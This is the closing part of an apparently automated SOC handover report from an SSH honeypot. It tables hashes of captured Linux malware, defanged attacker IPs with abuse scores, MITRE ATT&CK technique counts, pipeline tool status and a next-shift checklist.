| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **30/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `103.164.9[.]74` | PK | KHAZANA ENTERPRISE (PRIVATE) LIMITED | **100** ⚠️ | 28 |
| `61.106.81[.]18` | KR | HVEunpyeong | **100** ⚠️ | 26 |
| `1.213.214[.]233` | KR | LG DACOM Corporation | **100** ⚠️ | 25 |
| `101.37.118[.]215` | CN | Aliyun Computing Co., LTD | **100** ⚠️ | 3 |
| `197.225.146[.]23` | MU | MauritiusTelecom | **100** ⚠️ | 50 |
| `103.59.94[.]199` | ID | PT Lakuloka Digital Indonesia | **100** ⚠️ | 11 |
| `152.250.243[.]47` | BR | TELEFÔNICA BRASIL S.A | **100** ⚠️ | 50 |
| `57.128.214[.]238` | PL | OVH Sp. z o. o. | **100** ⚠️ | 34 |
| `124.228.34[.]69` | CN | CHINANET Hunan province network | **100** ⚠️ | 35 |
| `117.159.39[.]226` | CN | China Mobile Communications Corporation | **100** ⚠️ | 6 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 191 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 91 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 74 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 37 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 37 |

---

## 🔕 False Positive Summary (25 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 23 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 2 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 229 cases |
| Tool 34  | Credential Extractor        | ✅ 165 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 6 fingerprints |
| Tool 36  | Command Clustering          | ✅ 3 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 24 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 25 filtered (10.9%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 21 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 23 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 74 priority case(s) shown individually · 18 recon entry/entries in table (5 group(s) consolidating 117 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-25T10:50:02Z_
